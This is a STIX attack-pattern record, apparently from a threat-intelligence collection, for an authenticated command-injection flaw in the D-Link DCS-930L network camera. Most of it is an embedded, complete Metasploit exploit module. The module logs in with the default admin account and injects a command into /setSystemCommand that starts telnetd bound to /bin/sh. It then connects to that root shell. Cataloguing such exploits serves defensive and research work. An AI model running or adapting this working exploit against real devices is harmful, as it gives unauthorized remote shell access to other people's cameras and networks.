{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f510580-8c31-46e8-baca-1963009c124e",
    "created": "2024-08-14T17:04:06.084156Z",
    "modified": "2024-08-14T17:04:06.08416Z",
    "name": "D-Link DCS-930L Authenticated Remote Command Execution",
    "description": " The D-Link DCS-930L Network Video Camera is vulnerable to OS Command Injection via the web interface.  The vulnerability exists at /setSystemCommand, which is accessible with credentials. This vulnerability was present in firmware version 2.01 and fixed by 2.12. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dcs_930l_authenticated_remote_command_execution.rb",
            "external_id": "dlink_dcs_930l_authenticated_remote_command_execution.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Telnet\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'D-Link DCS-930L Authenticated Remote Command Execution',\n      'Description' => %q{\n        The D-Link DCS-930L Network Video Camera is vulnerable\n        to OS Command Injection via the web interface.  The vulnerability\n        exists at /setSystemCommand, which is accessible with credentials.\n        This vulnerability was present in firmware version 2.01 and fixed\n        by 2.12.\n      },\n      'Author'      =>\n        [\n          'Nicholas Starke <nick@alephvoid.com>'\n        ],\n      'License'         => MSF_LICENSE,\n      'DisclosureDate'  => '2015-12-20',\n      'Privileged'      => true,\n      'Platform'        => 'unix',\n      'Arch'            => ARCH_CMD,\n      'Payload'         =>\n        {\n          'Compat'  => {\n          'PayloadType'    => 'cmd_interact',\n          'ConnectionType' => 'find',\n          },\n        },\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n      'Targets'        =>\n        [\n          [  'Automatic',     { } ],\n        ],\n      'DefaultTarget'  => 0\n     ))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'User to login with', 'admin']),\n        OptString.new('HttpPassword', [ false, 'Password to login with', ''])\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet Command', 10]),\n        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])\n      ])\n  end\n\n  def telnet_timeout\n    (datastore['TelnetTimeout'] || 10)\n  end\n\n  def banner_timeout\n    (datastore['TelnetBannerTimeout'] || 25)\n  end\n\n  def exploit\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword'] || ''\n\n    test_login(user, pass)\n    exploit_telnet\n  end\n\n  def test_login(user, pass)\n    print_status(\"#{peer} - Trying to login with #{user} : #{pass}\")\n\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET',\n      'authorization' => basic_auth(user, pass)\n    })\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - invalid credentials (response code: #{res.code}\") if res.code != 200\n\n    print_good(\"#{peer} - Successful login #{user} : #{pass}\")\n  end\n\n  def exploit_telnet\n    telnet_port = rand(32767) + 32768\n\n    print_status(\"#{peer} - Telnet Port: #{telnet_port}\")\n\n    cmd = \"telnetd -p #{telnet_port} -l/bin/sh\"\n\n    telnet_request(cmd)\n\n    print_status(\"#{rhost}:#{telnet_port} - Trying to establish telnet connection...\")\n    ctx = { 'Msf' => framework, 'MsfExploit' => self }\n    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnet_port, 'Context' => ctx, 'Timeout' => telnet_timeout })\n\n    if sock.nil?\n      fail_with(Failure::Unreachable, \"#{rhost}:#{telnet_port} - Backdoor service unreachable\")\n    end\n\n    add_socket(sock)\n\n    print_status(\"#{rhost}:#{telnet_port} - Trying to establish a telnet session...\")\n    prompt = negotiate_telnet(sock)\n\n    if prompt.nil?\n      sock.close\n      fail_with(Failure::Unknown, \"#{rhost}:#{telnet_port} - Unable to establish a telnet session\")\n    else\n      print_good(\"#{rhost}:#{telnet_port} - Telnet session successfully established\")\n    end\n\n    handler(sock)\n  end\n\n  def telnet_request(cmd)\n    uri = '/setSystemCommand'\n\n    begin\n      res = send_request_cgi({\n        'uri' => uri,\n        'method' => 'POST',\n        'vars_post' => {\n          'ReplySuccessPage' => 'docmd.htm',\n          'ReplyErrorPage' => 'docmd.htm',\n          'SystemCommand'  => cmd,\n          'ConfigSystemCommand' => 'Save'\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def negotiate_telnet(sock)\n    begin\n      Timeout.timeout(banner_timeout) do\n        while(true)\n          data = sock.get_once(-1, telnet_timeout)\n          return nil if not data or data.length == 0\n          if data =~ /BusyBox/\n            return true\n          end\n        end\n      end\n    rescue ::Timeout::Error\n      return nil\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-12-20",
    "x_mitre_platforms": [
        "unix'"
    ]
}